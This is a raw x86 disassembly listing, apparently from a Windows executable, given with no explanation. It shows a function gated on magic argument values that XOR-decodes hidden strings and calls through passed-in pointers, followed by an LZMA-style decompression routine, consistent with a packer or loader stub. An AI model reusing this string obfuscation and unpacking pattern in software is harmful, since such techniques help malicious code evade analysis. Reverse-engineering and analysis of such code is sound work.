  41ce11:	mov    al,0x42
  41ce13:	add    BYTE PTR [eax+esi*4],bl
  41ce16:	inc    edx
  41ce17:	add    BYTE PTR [eax],al
  41ce19:	rol    BYTE PTR [edx+0x0],0x4
  41ce1d:	rol    BYTE PTR [edx+0x0],0x8
  41ce21:	rol    BYTE PTR [edx+0x0],0xc
  41ce25:	rol    BYTE PTR [edx+0x0],0x10
  41ce29:	rol    BYTE PTR [edx+0x0],0x14
  41ce2d:	rol    BYTE PTR [edx+0x0],0x18
  41ce31:	rol    BYTE PTR [edx+0x0],0x1c
  41ce35:	rol    BYTE PTR [edx+0x0],0x0
  41ce39:	add    BYTE PTR [eax],al
  41ce3b:	add    BYTE PTR [eax],al
  41ce3d:	add    BYTE PTR [eax],al
  41ce3f:	add    BYTE PTR [edx+0x53],dl
  41ce42:	inc    esp
  41ce43:	push   ebx
  41ce44:	and    al,0xd3
  41ce46:	les    eax,FWORD PTR [edi+0x4e]
  41ce49:	in     eax,0x95
  41ce4b:	dec    ecx
  41ce4c:	lahf   
  41ce4d:	inc    esi
  41ce4e:	not    esi
  41ce50:	fwait
  41ce51:	js     0x41cecd
  41ce53:	(bad)  
  41ce54:	add    DWORD PTR [eax],eax
  41ce56:	add    BYTE PTR [eax],al
  41ce58:	inc    ebx
  41ce59:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  41ce5d:	jb     0x41ced1
  41ce5f:	outs   dx,BYTE PTR gs:[esi]
  41ce61:	je     0x41cea7
  41ce63:	popa   
  41ce64:	je     0x41cec7
  41ce66:	pop    esp
  41ce67:	dec    ebp
  41ce68:	outs   dx,DWORD PTR ds:[esi]
  41ce69:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  41ce71:	ins    BYTE PTR es:[edi],dx
  41ce72:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  41ce79:	dec    esi
  41ce7a:	gs ja  0x41ce7d
  41ce7d:	mov    edx,DWORD PTR [ebp-0x14]
  41ce80:	sub    esp,0xe4
  41ce86:	push   ebx
  41ce87:	push   edi
  41ce88:	mov    eax,ebx
  41ce8a:	xchg   ecx,eax
  41ce8b:	mov    eax,DWORD PTR [ebp+0x8]
  41ce8e:	mov    edi,0xf89c8585
  41ce93:	cmp    eax,edi
  41ce95:	jne    0x41d21d
  41ce9b:	mov    eax,DWORD PTR [ebp+0xc]
  41ce9e:	cmp    eax,0xf89c8584
  41cea3:	jne    0x41d21d
  41cea9:	mov    eax,DWORD PTR [ebp+0x24]
  41ceac:	mov    DWORD PTR [ebp-0x4],eax
  41ceaf:	mov    BYTE PTR [ebp-0x18],0x1b
  41ceb3:	mov    BYTE PTR [ebp-0x17],0x18
  41ceb7:	mov    BYTE PTR [ebp-0x16],0x5
  41cebb:	mov    BYTE PTR [ebp-0x15],0x4f
  41cebf:	mov    BYTE PTR [ebp-0x14],0x4e
  41cec3:	mov    BYTE PTR [ebp-0x13],0x7c
  41cec7:	mov    BYTE PTR [ebp-0x20],0x9
  41cecb:	mov    BYTE PTR [ebp-0x1f],0xf
  41cecf:	mov    BYTE PTR [ebp-0x1e],0x19
  41ced3:	mov    BYTE PTR [ebp-0x1d],0xe
  41ced7:	mov    BYTE PTR [ebp-0x1c],0x4f
  41cedb:	mov    BYTE PTR [ebp-0x1b],0x4e
  41cedf:	mov    BYTE PTR [ebp-0x1a],0x7c
  41cee3:	mov    BYTE PTR [ebp-0x28],0xf
  41cee7:	mov    BYTE PTR [ebp-0x27],0x4
  41ceeb:	mov    BYTE PTR [ebp-0x26],0x0
  41ceef:	mov    BYTE PTR [ebp-0x25],0xb
  41cef3:	push   esi
  41cef4:	mov    BYTE PTR [ebp-0x24],0x1d
  41cef8:	mov    BYTE PTR [ebp-0x23],0xc
  41cefc:	push   0x74
  41cefe:	mov    BYTE PTR [ebp-0x22],0x5
  41cf02:	mov    BYTE PTR [ebp-0x21],0x7c
  41cf06:	xor    esi,esi
  41cf08:	pop    edx
  41cf09:	mov    eax,0xf8
  41cf0e:	lea    ecx,[ebp+esi*1-0x18]
  41cf12:	movzx  ebx,BYTE PTR [ecx]
  41cf15:	xor    ebx,edx
  41cf17:	add    ebx,eax
  41cf19:	inc    esi
  41cf1a:	mov    BYTE PTR [ecx],bl
  41cf1c:	cmp    esi,0x6
  41cf1f:	jb     0x41cf0e
  41cf21:	xor    esi,esi
  41cf23:	lea    ecx,[ebp+esi*1-0x20]
  41cf27:	movzx  ebx,BYTE PTR [ecx]
  41cf2a:	xor    ebx,edx
  41cf2c:	add    ebx,eax
  41cf2e:	inc    esi
  41cf2f:	mov    BYTE PTR [ecx],bl
  41cf31:	cmp    esi,0x7
  41cf34:	jb     0x41cf23
  41cf36:	xor    esi,esi
  41cf38:	lea    ecx,[ebp+esi*1-0x28]
  41cf3c:	movzx  ebx,BYTE PTR [ecx]
  41cf3f:	xor    ebx,edx
  41cf41:	add    ebx,eax
  41cf43:	inc    esi
  41cf44:	mov    BYTE PTR [ecx],bl
  41cf46:	cmp    esi,0x8
  41cf49:	jb     0x41cf38
  41cf4b:	lea    eax,[ebp-0x2c]
  41cf4e:	mov    DWORD PTR [ebp-0x8],eax
  41cf51:	mov    ecx,DWORD PTR [ebp-0x8]
  41cf54:	mov    eax,0x7113fcef
  41cf59:	mov    DWORD PTR [ecx],eax
  41cf5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  41cf5e:	cmp    ecx,eax
  41cf60:	jne    0x41cf6c
  41cf62:	mov    DWORD PTR [ebp-0x8],edi
  41cf65:	mov    DWORD PTR [ebp-0x8],0xf89c85ea
  41cf6c:	mov    eax,DWORD PTR [ebp-0x4]
  41cf6f:	mov    ecx,DWORD PTR [eax+0x18c]
  41cf75:	xor    eax,eax
  41cf77:	mov    ebx,0x3272e2
  41cf7c:	cmp    DWORD PTR [ecx],eax
  41cf7e:	jne    0x41d1b6
  41cf84:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf87:	mov    ecx,DWORD PTR [ecx+0x17c]
  41cf8d:	mov    DWORD PTR [ecx],eax
  41cf8f:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf92:	mov    ecx,DWORD PTR [ecx+0x180]
  41cf98:	mov    DWORD PTR [ecx],eax
  41cf9a:	mov    esi,0x4e22
  41cf9f:	mov    eax,0x4f8f
  41cfa4:	mov    WORD PTR [ebp-0x78],ax
  41cfa8:	mov    eax,esi
  41cfaa:	mov    WORD PTR [ebp-0x76],ax
  41cfae:	add    eax,0x5d
  41cfb1:	mov    WORD PTR [ebp-0x74],ax
  41cfb5:	lea    eax,[esi+0x1d]
  41cfb8:	mov    WORD PTR [ebp-0x72],ax
  41cfbc:	mov    eax,0x4f92
  41cfc1:	mov    WORD PTR [ebp-0x70],ax
  41cfc5:	lea    eax,[esi+0x1c]
  41cfc8:	mov    WORD PTR [ebp-0x6e],ax
  41cfcc:	add    eax,0x3f
  41cfcf:	mov    WORD PTR [ebp-0x6c],ax
  41cfd3:	lea    eax,[esi+0x16]
  41cfd6:	mov    WORD PTR [ebp-0x6a],ax
  41cfda:	mov    eax,esi
  41cfdc:	mov    WORD PTR [ebp-0x68],ax
  41cfe0:	add    eax,0x19
  41cfe3:	mov    WORD PTR [ebp-0x66],ax
  41cfe7:	mov    eax,0x99ff
  41cfec:	mov    WORD PTR [ebp-0x64],ax
  41cff0:	mov    eax,0x828e
  41cff5:	mov    WORD PTR [ebp-0x62],ax
  41cff9:	mov    eax,0xd78d
  41cffe:	mov    WORD PTR [ebp-0x60],ax
  41d002:	add    eax,0x1c
  41d005:	mov    WORD PTR [ebp-0x5e],ax
  41d009:	mov    eax,0x27a8
  41d00e:	mov    WORD PTR [ebp-0x5c],ax
  41d012:	mov    eax,0x47a8
  41d017:	mov    WORD PTR [ebp-0x5a],ax
  41d01b:	lea    eax,[esi+0x17]
  41d01e:	push   0x8
  41d020:	mov    WORD PTR [ebp-0x58],ax
  41d024:	mov    DWORD PTR [ebp-0x10],0xb00040f
  41d02b:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  41d032:	lea    eax,[ebp-0x10]
  41d035:	pop    edi
  41d036:	mov    cl,BYTE PTR [eax]
  41d038:	xor    cl,dl
  41d03a:	sub    cl,0x8
  41d03d:	mov    BYTE PTR [eax],cl
  41d03f:	inc    eax
  41d040:	dec    edi
  41d041:	jne    0x41d036
  41d043:	lea    eax,[ebp-0x10]
  41d046:	mov    DWORD PTR [ebp-0xb8],eax
  41d04c:	lea    eax,[ebp-0xbc]
  41d052:	push   eax
  41d053:	mov    eax,DWORD PTR [ebp+0xc]
  41d056:	mov    edi,0x751089b
  41d05b:	xor    eax,edi
  41d05d:	add    eax,ebx
  41d05f:	push   eax
  41d060:	mov    eax,DWORD PTR [ebp-0x4]
  41d063:	add    eax,0x66
  41d066:	push   eax
  41d067:	mov    eax,DWORD PTR [ebp-0x4]
  41d06a:	mov    eax,DWORD PTR [eax+0x198]
  41d070:	mov    DWORD PTR [ebp-0xbc],0x1
  41d07a:	push   DWORD PTR [eax]
  41d07c:	mov    eax,DWORD PTR [ebp+0x10]
  41d07f:	call   eax
  41d081:	mov    ecx,DWORD PTR [ebp+0x8]
  41d084:	xor    ecx,edi
  41d086:	add    ecx,ebx
  41d088:	mov    DWORD PTR [ebp-0x8],eax
  41d08b:	cmp    eax,ecx
  41d08d:	jne    0x41d0a8
  41d08f:	mov    eax,ds:0x33730bee
  41d094:	or     eax,0x22150bef
  41d099:	mov    ds:0x33730bee,eax
  41d09e:	add    eax,0x3372e90f
  41d0a3:	mov    ds:0x33730bee,eax
  41d0a8:	mov    ecx,0x4f8a
  41d0ad:	mov    eax,ecx
  41d0af:	mov    WORD PTR [ebp-0x40],ax
  41d0b3:	mov    eax,0x4e71
  41d0b8:	mov    edx,eax
  41d0ba:	mov    WORD PTR [ebp-0x3e],dx
  41d0be:	lea    edx,[ecx+0xf]
  41d0c1:	mov    WORD PTR [ebp-0x3c],dx
  41d0c5:	add    edx,0xfffffff8
  41d0c8:	mov    WORD PTR [ebp-0x3a],dx
  41d0cc:	lea    edx,[ecx+0x9]
  41d0cf:	mov    WORD PTR [ebp-0x38],dx
  41d0d3:	add    edx,0x19
  41d0d6:	mov    WORD PTR [ebp-0x36],dx
  41d0da:	lea    edx,[ecx+0x1b]
  41d0dd:	mov    WORD PTR [ebp-0x34],dx
  41d0e1:	mov    WORD PTR [ebp-0x32],cx
  41d0e5:	mov    ecx,esi
  41d0e7:	mov    WORD PTR [ebp-0x30],cx
  41d0eb:	lea    ecx,[edx+0x5]
  41d0ee:	mov    edx,ecx
  41d0f0:	mov    WORD PTR [ebp-0x54],dx
  41d0f4:	mov    edx,eax
  41d0f6:	mov    WORD PTR [ebp-0x52],dx
  41d0fa:	add    edx,0x8
  41d0fd:	mov    WORD PTR [ebp-0x50],dx
  41d101:	mov    WORD PTR [ebp-0x4e],ax
  41d105:	add    eax,0x2
  41d108:	mov    WORD PTR [ebp-0x4c],ax
  41d10c:	lea    eax,[ecx-0x1e]
  41d10f:	mov    WORD PTR [ebp-0x4a],ax
  41d113:	add    eax,0xfffffff9
  41d116:	mov    WORD PTR [ebp-0x48],ax
  41d11a:	mov    WORD PTR [ebp-0x46],cx
  41d11e:	mov    WORD PTR [ebp-0x44],si
  41d122:	mov    eax,DWORD PTR [ebp+0x8]
  41d125:	movzx  ecx,WORD PTR [ebp-0x54]
  41d129:	xor    eax,edi
  41d12b:	add    eax,ebx
  41d12d:	xor    eax,ecx
  41d12f:	mov    WORD PTR [ebp-0x54],ax
  41d133:	mov    eax,DWORD PTR [ebp+0x8]
  41d136:	movzx  ecx,WORD PTR [ebp-0x40]
  41d13a:	xor    eax,edi
  41d13c:	add    eax,ebx
  41d13e:	xor    eax,ecx
  41d140:	mov    WORD PTR [ebp-0x40],ax
  41d144:	xor    eax,eax
  41d146:	mov    WORD PTR [ebp-0xd0],ax
  41d14d:	mov    WORD PTR [ebp-0xe4],ax
  41d154:	mov    edi,DWORD PTR [ebp+0x24]
  41d157:	lea    eax,[ebp-0xd0]
  41d15d:	lea    edx,[ebp-0x54]
  41d160:	mov    DWORD PTR [ebp-0xbc],0x2
  41d16a:	mov    DWORD PTR [ebp-0xb8],eax
  41d170:	call   0x41fafc
  41d175:	mov    DWORD PTR [ebp-0xb4],eax
  41d17b:	lea    eax,[ebp-0xbc]
  41d181:	push   eax
  41d182:	mov    eax,DWORD PTR [ebp+0xc]
  41d185:	xor    eax,0x751089b
  41d18a:	add    eax,ebx
  41d18c:	push   eax
  41d18d:	lea    eax,[ebp-0x78]
  41d190:	push   eax
  41d191:	push   DWORD PTR [ebp-0x8]
  41d194:	mov    eax,DWORD PTR [ebp+0x10]
  41d197:	call   eax
  41d199:	mov    edi,DWORD PTR [ebp+0x24]
  41d19c:	lea    eax,[ebp-0xe4]
  41d1a2:	lea    edx,[ebp-0x40]
  41d1a5:	mov    DWORD PTR [ebp-0xb8],eax
  41d1ab:	call   0x41fafc
  41d1b0:	mov    DWORD PTR [ebp-0xb4],eax
  41d1b6:	mov    eax,DWORD PTR [ebp+0x14]
  41d1b9:	push   DWORD PTR [ebp-0x4]
  41d1bc:	push   DWORD PTR [ebp+0x20]
  41d1bf:	push   DWORD PTR [ebp+0x1c]
  41d1c2:	push   DWORD PTR [ebp+0x18]
  41d1c5:	push   DWORD PTR [ebp+0x10]
  41d1c8:	push   DWORD PTR [ebp+0x8]
  41d1cb:	push   DWORD PTR [ebp+0xc]
  41d1ce:	call   0x41e378
  41d1d3:	test   eax,eax
  41d1d5:	je     0x41d21c
  41d1d7:	add    DWORD PTR [ebp-0x4],eax
  41d1da:	push   DWORD PTR [ebp-0x4]
  41d1dd:	lea    esi,[ebp+0x4]
  41d1e0:	call   0x41d60c
  41d1e5:	mov    eax,DWORD PTR [ebp-0x4]
  41d1e8:	mov    eax,DWORD PTR [eax+0x1c8]
  41d1ee:	mov    eax,DWORD PTR [eax]
  41d1f0:	xor    eax,0x751089b
  41d1f5:	add    eax,ebx
  41d1f7:	mov    eax,DWORD PTR [ebp-0x4]
  41d1fa:	jne    0x41d212
  41d1fc:	mov    ecx,DWORD PTR [ebp-0x4]
  41d1ff:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d205:	push   DWORD PTR [ecx]
  41d207:	mov    eax,DWORD PTR [eax+0x1d8]
  41d20d:	call   DWORD PTR [eax+0x28]
  41d210:	jmp    0x41d21c
  41d212:	mov    eax,DWORD PTR [eax+0x17c]
  41d218:	mov    eax,DWORD PTR [eax]
  41d21a:	add    DWORD PTR [esi],eax
  41d21c:	pop    esi
  41d21d:	pop    edi
  41d21e:	pop    ebx
  41d21f:	leave  
  41d220:	ret    0x20
  41d223:	push   edi
  41d224:	push   esi
  41d225:	push   ebx
  41d226:	push   ebp
  41d227:	mov    ebp,esp
  41d229:	mov    eax,DWORD PTR [ebp+0x24]
  41d22c:	add    DWORD PTR [ebp+0x28],eax
  41d22f:	push   eax
  41d230:	cld    
  41d231:	mov    esi,DWORD PTR [ebp+0x18]
  41d234:	add    DWORD PTR [ebp+0x1c],esi
  41d237:	push   esi
  41d238:	mov    esi,DWORD PTR [ebp+0x14]
  41d23b:	lods   eax,DWORD PTR ds:[esi]
  41d23c:	xchg   edx,eax
  41d23d:	push   edx
  41d23e:	mov    cl,BYTE PTR [esi-0x2]
  41d241:	or     eax,0xffffffff
  41d244:	shl    eax,cl
  41d246:	not    eax
  41d248:	push   eax
  41d249:	mov    cl,dh
  41d24b:	or     eax,0xffffffff
  41d24e:	shl    eax,cl
  41d250:	not    eax
  41d252:	push   eax
  41d253:	add    cl,dl
  41d255:	mov    edi,esi
  41d257:	sub    esp,0xc
  41d25a:	sub    eax,eax
  41d25c:	inc    eax
  41d25d:	push   eax
  41d25e:	push   eax
  41d25f:	push   eax
  41d260:	push   eax
  41d261:	push   eax
  41d262:	push   edi
  41d263:	sub    esi,esi
  41d265:	push   esi
  41d266:	or     ebx,0xffffffff
  41d269:	mov    eax,0x300
  41d26e:	shl    eax,cl
  41d270:	lea    ecx,[eax+0x736]
  41d276:	mov    eax,0x4000400
  41d27b:	shr    ecx,1
  41d27d:	rep stos DWORD PTR es:[edi],eax
  41d27f:	push   0x5
  41d281:	pop    ecx
  41d282:	call   0x41d56d
  41d287:	loop   0x41d282
  41d289:	lea    esi,[esi]
  41d28b:	lea    edi,[edi]
  41d28d:	mov    edi,DWORD PTR [ebp-0x4]
  41d290:	mov    eax,DWORD PTR [ebp-0x10]
  41d293:	sub    edi,DWORD PTR [ebp+0x24]
  41d296:	and    eax,edi
  41d298:	mov    DWORD PTR [ebp-0x18],eax
  41d29b:	mov    al,0x0
  41d29d:	call   0x41d585
  41d2a2:	jne    0x41d33d
  41d2a8:	mov    cl,BYTE PTR [ebp-0xc]
  41d2ab:	and    edi,DWORD PTR [ebp-0x14]
  41d2ae:	shl    edi,cl
  41d2b0:	sub    cl,0x8
  41d2b3:	neg    cl
  41d2b5:	shr    esi,cl
  41d2b7:	pop    eax
  41d2b8:	add    edi,esi
  41d2ba:	pop    esi
  41d2bb:	lea    edi,[edi+edi*2]
  41d2be:	shl    edi,0x8
  41d2c1:	cmp    al,0x7
  41d2c3:	pop    edx
  41d2c4:	lea    ecx,[esi+edi*2+0xe6c]
  41d2cb:	push   ecx
  41d2cc:	push   esi
  41d2cd:	mov    esi,0x100
  41d2d2:	push   eax
  41d2d3:	mov    al,0x1
  41d2d5:	jb     0x41d30b
  41d2d7:	mov    edi,DWORD PTR [ebp-0x4]
  41d2da:	sub    edi,DWORD PTR [ebp-0x24]
  41d2dd:	movzx  edi,BYTE PTR [edi]
  41d2e0:	mov    ebp,DWORD PTR [ebp-0x34]
  41d2e3:	shl    edi,1
  41d2e5:	mov    ecx,esi
  41d2e7:	and    esi,edi
  41d2e9:	add    ecx,esi
  41d2eb:	lea    ebp,[ebp+ecx*2+0x0]
  41d2ef:	call   0x41d5a4
  41d2f4:	mov    ecx,eax
  41d2f6:	shr    esi,0x8
  41d2f9:	and    ecx,0x1
  41d2fc:	cmp    esi,ecx
  41d2fe:	mov    esi,0x100
  41d303:	jne    0x41d313
  41d305:	cmp    eax,esi
  41d307:	jb     0x41d2e0
  41d309:	jmp    0x41d31f
  41d30b:	mov    ebp,DWORD PTR [ebp-0x34]
  41d30e:	call   0x41d5a4
  41d313:	inc    eax
  41d314:	inc    esi
  41d315:	sub    eax,0x1
  41d318:	sub    esi,0x1
  41d31b:	cmp    eax,esi
  41d31d:	jb     0x41d30b
  41d31f:	pop    edx
  41d320:	inc    edx
  41d321:	cmp    edx,0x5
  41d324:	dec    edx
  41d325:	mov    ecx,edx
  41d327:	jb     0x41d338
  41d329:	inc    edx
  41d32a:	cmp    edx,0xb
  41d32d:	dec    edx
  41d32e:	mov    cl,0x4
  41d330:	dec    cl
  41d332:	jb     0x41d338
  41d334:	mov    cl,0x7
  41d336:	dec    cl
  41d338:	sub    edx,ecx
  41d33a:	push   edx
  41d33b:	jmp    0x41d38c
  41d33d:	mov    al,0xc1
  41d33f:	dec    al
  41d341:	call   0x41d595
  41d346:	jne    0x41d35c
  41d348:	pop    eax
  41d349:	pop    edi
  41d34a:	pop    edx
  41d34b:	pop    ecx
  41d34c:	pop    edx
  41d34d:	pop    ecx
  41d34e:	push   DWORD PTR [esp]
  41d351:	push   ecx
  41d352:	push   edx
  41d353:	mov    edx,0x664
  41d358:	mov    cl,0x0
  41d35a:	jmp    0x41d3cf
  41d35c:	mov    al,0xcd
  41d35e:	dec    al
  41d360:	call   0x41d595
  41d365:	jne    0x41d395
  41d367:	mov    al,0xf1
  41d369:	dec    al
  41d36b:	call   0x41d585
  41d370:	jne    0x41d3c5
  41d372:	pop    eax
  41d373:	cmp    al,0x7
  41d375:	mov    al,0x9
  41d377:	jb     0x41d37b
  41d379:	mov    al,0xb
  41d37b:	push   eax
  41d37c:	mov    esi,DWORD PTR [ebp-0x4]
  41d37f:	sub    esi,DWORD PTR [ebp-0x24]
  41d382:	cmp    esi,DWORD PTR [ebp+0x24]
  41d385:	jb     0x41d55c
  41d38b:	lods   al,BYTE PTR ds:[esi]
  41d38c:	mov    edi,DWORD PTR [ebp-0x4]
  41d38f:	stos   BYTE PTR es:[edi],al
  41d390:	jmp    0x41d523
  41d395:	mov    al,0xd8
  41d397:	call   0x41d595
  41d39c:	mov    esi,DWORD PTR [ebp-0x28]
  41d39f:	je     0x41d3bc
  41d3a1:	mov    al,0xe4
  41d3a3:	call   0x41d595
  41d3a8:	mov    esi,DWORD PTR [ebp-0x2c]
  41d3ab:	je     0x41d3b6
  41d3ad:	mov    esi,DWORD PTR [ebp-0x30]
  41d3b0:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d3b3:	mov    DWORD PTR [ebp-0x30],ecx
  41d3b6:	mov    ecx,DWORD PTR [ebp-0x28]
  41d3b9:	mov    DWORD PTR [ebp-0x2c],ecx
  41d3bc:	mov    ecx,DWORD PTR [ebp-0x24]
  41d3bf:	mov    DWORD PTR [ebp-0x28],ecx
  41d3c2:	mov    DWORD PTR [ebp-0x24],esi
  41d3c5:	pop    eax
  41d3c6:	pop    edi
  41d3c7:	pop    ecx
  41d3c8:	mov    edx,0xa68
  41d3cd:	mov    cl,0x8
  41d3cf:	add    edx,edi
  41d3d1:	push   edx
  41d3d2:	push   edi
  41d3d3:	cmp    al,0x7
  41d3d5:	mov    al,cl
  41d3d7:	jb     0x41d3db
  41d3d9:	add    al,0x3
  41d3db:	push   eax
  41d3dc:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3df:	call   0x41d5a2
  41d3e4:	jne    0x41d3fa
  41d3e6:	mov    eax,DWORD PTR [ebp-0x18]
  41d3e9:	mov    edi,DWORD PTR [ebp-0x34]
  41d3ec:	shl    eax,0x3
  41d3ef:	sub    ecx,ecx
  41d3f1:	push   0x8
  41d3f3:	pop    esi
  41d3f4:	lea    edi,[edi+eax*2+0x4]
  41d3f8:	jmp    0x41d42f
  41d3fa:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3fd:	add    ebp,0x2
  41d400:	call   0x41d5a2
  41d405:	jne    0x41d41f
  41d407:	mov    eax,DWORD PTR [ebp-0x18]
  41d40a:	mov    edi,DWORD PTR [ebp-0x34]
  41d40d:	shl    eax,0x3
  41d410:	push   0x8
  41d412:	pop    ecx
  41d413:	push   0x8
  41d415:	pop    esi
  41d416:	lea    edi,[edi+eax*2+0x104]
  41d41d:	jmp    0x41d42f
  41d41f:	mov    edi,0x204
  41d424:	add    edi,DWORD PTR [ebp-0x34]
  41d427:	push   0x10
  41d429:	pop    ecx
  41d42a:	mov    esi,0x100
  41d42f:	mov    DWORD PTR [ebp-0x1c],ecx
  41d432:	sub    eax,eax
  41d434:	inc    eax
  41d435:	mov    ebp,edi
  41d437:	call   0x41d5a4
  41d43c:	mov    ecx,eax
  41d43e:	sub    ecx,esi
  41d440:	jb     0x41d435
  41d442:	add    DWORD PTR [ebp-0x1c],ecx
  41d445:	cmp    DWORD PTR [ebp-0x3c],0x4
  41d449:	jae    0x41d4ff
  41d44f:	add    DWORD PTR [ebp-0x3c],0x7
  41d453:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d456:	cmp    ecx,0x4
  41d459:	jb     0x41d45e
  41d45b:	push   0x3
  41d45d:	pop    ecx
  41d45e:	mov    edi,DWORD PTR [ebp-0x38]
  41d461:	shl    ecx,0x6
  41d464:	sub    eax,eax
  41d466:	inc    eax
  41d467:	push   0x40
  41d469:	pop    esi
  41d46a:	lea    edi,[edi+ecx*2+0x360]
  41d471:	mov    ebp,edi
  41d473:	call   0x41d5a4
  41d478:	mov    ecx,eax
  41d47a:	sub    ecx,esi
  41d47c:	jb     0x41d471
  41d47e:	mov    DWORD PTR [ebp-0x18],ecx
  41d481:	mov    DWORD PTR [ebp-0x24],ecx
  41d484:	cmp    ecx,0x4
  41d487:	jb     0x41d4fc
  41d489:	mov    esi,ecx
  41d48b:	and    DWORD PTR [ebp-0x24],0x1
  41d48f:	shr    esi,1
  41d491:	or     DWORD PTR [ebp-0x24],0x2
  41d495:	dec    esi
  41d496:	cmp    ecx,0xe
  41d499:	jae    0x41d4b4
  41d49b:	mov    eax,0x2af
  41d4a0:	sub    eax,ecx
  41d4a2:	mov    ecx,esi
  41d4a4:	shl    BYTE PTR [ebp-0x24],cl
  41d4a7:	add    eax,DWORD PTR [ebp-0x24]
  41d4aa:	shl    eax,1
  41d4ac:	add    eax,DWORD PTR [ebp-0x38]
  41d4af:	mov    DWORD PTR [ebp-0x34],eax
  41d4b2:	jmp    0x41d4e1
  41d4b4:	sub    esi,0x4
  41d4b7:	call   0x41d561
  41d4bc:	shr    ebx,1
  41d4be:	shl    DWORD PTR [ebp-0x24],1
  41d4c1:	cmp    DWORD PTR [ebp-0x20],ebx
  41d4c4:	jb     0x41d4cc
  41d4c6:	inc    DWORD PTR [ebp-0x24]
  41d4c9:	sub    DWORD PTR [ebp-0x20],ebx
  41d4cc:	dec    esi
  41d4cd:	jne    0x41d4b7
  41d4cf:	mov    eax,0x644
  41d4d4:	add    eax,DWORD PTR [ebp-0x38]
  41d4d7:	mov    DWORD PTR [ebp-0x34],eax
  41d4da:	shl    DWORD PTR [ebp-0x24],0x4
  41d4de:	push   0x4
  41d4e0:	pop    esi
  41d4e1:	sub    edi,edi
  41d4e3:	inc    edi
  41d4e4:	mov    eax,edi
  41d4e6:	mov    ebp,DWORD PTR [ebp-0x34]
  41d4e9:	call   0x41d5a4
  41d4ee:	test   al,0x1
  41d4f0:	je     0x41d4f5
  41d4f2:	or     DWORD PTR [ebp-0x24],edi
  41d4f5:	shl    edi,1
  41d4f7:	dec    esi
  41d4f8:	jne    0x41d4e6
  41d4fa:	jmp    0x41d4fc
  41d4fc:	inc    DWORD PTR [ebp-0x24]
  41d4ff:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d502:	add    ecx,0x2
  41d505:	mov    edi,DWORD PTR [ebp-0x4]
  41d508:	mov    eax,edi
  41d50a:	sub    eax,DWORD PTR [ebp+0x24]
  41d50d:	cmp    DWORD PTR [ebp-0x24],eax
  41d510:	ja     0x41d55c
  41d512:	mov    esi,edi
  41d514:	sub    esi,DWORD PTR [ebp-0x24]
  41d517:	mov    edx,DWORD PTR [ebp+0x28]
  41d51a:	lods   al,BYTE PTR ds:[esi]
  41d51b:	stos   BYTE PTR es:[edi],al
  41d51c:	cmp    edi,edx
  41d51e:	jae    0x41d523
  41d520:	dec    ecx
  41d521:	jne    0x41d51a
  41d523:	mov    DWORD PTR [ebp-0x4],edi
  41d526:	movzx  esi,al
  41d529:	cmp    edi,DWORD PTR [ebp+0x28]
  41d52c:	jb     0x41d28d
  41d532:	call   0x41d561
  41d537:	sub    eax,eax
  41d539:	lea    ebp,[esp+0x3c]
  41d53d:	mov    edx,DWORD PTR [ebp+0x20]
  41d540:	mov    esi,DWORD PTR [ebp-0x8]
  41d543:	sub    esi,DWORD PTR [ebp+0x18]
  41d546:	mov    DWORD PTR [edx],esi
  41d548:	mov    edx,DWORD PTR [ebp+0x2c]
  41d54b:	mov    edi,DWORD PTR [ebp-0x4]
  41d54e:	sub    edi,DWORD PTR [ebp+0x24]
  41d551:	mov    DWORD PTR [edx],edi
  41d553:	leave  
  41d554:	pop    ebx
  41d555:	pop    esi
  41d556:	pop    edi
  41d557:	ret    0x1c
  41d55a:	pop    esi
  41d55b:	pop    eax
  41d55c:	sub    eax,eax
  41d55e:	inc    eax
  41d55f:	jmp    0x41d539
  41d561:	cmp    ebx,0x1000000
  41d567:	jb     0x41d56a
  41d569:	ret    
  41d56a:	shl    ebx,0x8
  41d56d:	push   esi
  41d56e:	mov    esi,DWORD PTR [ebp-0x8]
  41d571:	cmp    esi,DWORD PTR [ebp+0x1c]
  41d574:	jae    0x41d55a
  41d576:	mov    eax,DWORD PTR [ebp-0x20]
  41d579:	shl    eax,0x8
  41d57c:	lods   al,BYTE PTR ds:[esi]
  41d57d:	mov    DWORD PTR [ebp-0x20],eax
  41d580:	mov    DWORD PTR [ebp-0x8],esi
  41d583:	pop    esi
  41d584:	ret    
  41d585:	mov    ecx,DWORD PTR [ebp-0x3c]
  41d588:	movzx  eax,al
  41d58b:	shl    ecx,0x4
  41d58e:	add    eax,DWORD PTR [ebp-0x18]
  41d591:	add    eax,ecx
  41d593:	jmp    0x41d59b
  41d595:	movzx  eax,al
  41d598:	add    eax,DWORD PTR [ebp-0x3c]
  41d59b:	mov    ebp,DWORD PTR [ebp-0x38]
  41d59e:	lea    ebp,[ebp+eax*2+0x0]
  41d5a2:	sub    eax,eax
  41d5a4:	lea    ebp,[ebp+eax*2+0x0]
  41d5a8:	cmp    ebx,0x1000000
  41d5ae:	jae    0x41d5cc
  41d5b0:	mov    ecx,DWORD PTR [esp+0x38]
  41d5b4:	shl    DWORD PTR [esp+0x20],0x8
  41d5b9:	cmp    ecx,DWORD PTR [esp+0x5c]
  41d5bd:	jae    0x41d55b
  41d5bf:	mov    dl,BYTE PTR [ecx]
  41d5c1:	inc    DWORD PTR [esp+0x38]
  41d5c5:	shl    ebx,0x8
  41d5c8:	mov    BYTE PTR [esp+0x20],dl
  41d5cc:	mov    ecx,ebx
  41d5ce:	movzx  edx,WORD PTR [ebp+0x0]
  41d5d2:	shr    ecx,0xb
  41d5d5:	imul   ecx,edx
  41d5d8:	cmp    DWORD PTR [esp+0x20],ecx
  41d5dc:	jae    0x41d5f5
  41d5de:	mov    ebx,ecx
  41d5e0:	mov    ecx,0x800
  41d5e5:	sub    ecx,edx
  41d5e7:	shr    ecx,0x5
  41d5ea:	add    WORD PTR [ebp+0x0],cx
  41d5ee:	add    eax,eax
  41d5f0:	lea    ebp,[esp+0x40]
  41d5f4:	ret    
